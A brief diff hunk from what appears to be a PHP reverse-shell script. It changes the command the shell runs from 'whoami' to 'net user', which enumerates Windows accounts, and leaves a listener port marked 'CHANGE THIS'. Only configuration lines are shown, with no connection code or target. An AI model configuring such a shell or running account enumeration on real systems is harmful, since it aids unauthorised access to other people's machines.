@@ -7,7 +7,7 @@ $port = 12922;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'whoami';
+$shell = 'net user';
 $daemon = 0;
 $debug = 0;
 
